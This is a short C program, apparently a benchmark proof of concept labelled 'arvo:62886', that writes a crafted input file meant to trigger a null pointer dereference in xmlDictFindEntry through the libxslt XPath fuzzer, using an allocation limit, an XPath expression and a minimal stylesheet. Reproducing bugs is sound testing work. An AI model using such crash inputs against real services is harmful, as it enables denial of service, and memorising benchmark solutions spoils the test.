#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:62886 */
/* Triggers: null_pointer_dereference in xmlDictFindEntry (libxslt xpath fuzzer) */
/* Vuln class: null_pointer_dereference */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write 4-byte big-endian maxAllocs = 1 (cause allocation failure after 1 malloc) */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);

    /* Write XPath expression: "name(/*)" - triggers dict lookup via subdict */
    fputc('n', f);
    fputc('a', f);
    fputc('m', f);
    fputc('e', f);
    fputc('(', f);
    fputc('/', f);
    fputc('*', f);
    fputc(')', f);
    fputc('\\', f);
    fputc('\n', f);

    /* Write XSLT stylesheet (valid, minimal) that creates empty style->dict */
    fprintf(f, "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"/></xsl:stylesheet>");
    fputc('\\', f);
    fputc('\n', f);

    fclose(f);
    return 0;
}